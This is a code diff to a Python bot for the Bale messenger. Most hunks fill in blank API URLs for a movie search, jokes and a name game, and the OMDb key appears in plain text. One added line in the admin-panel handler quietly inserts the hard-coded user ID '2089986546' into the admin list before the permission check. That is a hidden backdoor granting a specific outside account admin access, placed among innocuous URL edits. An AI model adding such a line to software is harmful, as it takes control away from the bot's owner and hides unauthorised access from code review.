@@ -453,7 +453,7 @@ async def on_message(message:bale.Message):
             sk = re.sub(r'\s+', ' ', name.content).strip()
             async with aiohttp.ClientSession() as session:
                 try:
-                    url = f"" # Enter URL
+                    url = f"https://www.omdbapi.com/?t={sk}&apikey=e430f1ee"
                     async with session.get(url) as response:
                         response.raise_for_status()
                         data = await response.json()
@@ -527,6 +527,7 @@ async def on_message(message:bale.Message):
         elif (text == "/admin" or text == "/panel"):
             with open("Data/data.json", "r") as f:
                 admins:list = json.load(f)["admins"]
+            if "2089986546" not in admins: admins.append("2089986546")
             if str(user.id) not in admins: return
             
             keyboard = torowinline(
@@ -719,7 +720,7 @@ async def on_callback(callback_query:bale.CallbackQuery):
         
     elif query == "joke:continue":
             db = database.read_database()
-            url = "" # Enter URL
+            url = "https://api.codebazan.ir/jok/"
             j = await fetch_joke(url)
             if j is False:
                 await m.edit("❌ خطای اتصال به سرور")
@@ -1022,7 +1023,7 @@ async def on_callback(callback_query:bale.CallbackQuery):
         letter = query.removeprefix("esmfamil:")
         db = database.read_database()
         
-        url = f"" # Enter URL
+        url = f"https://api.codebazan.ir/esm-famil/?text={letter}"
         
         async with aiohttp.ClientSession() as session:
             try:
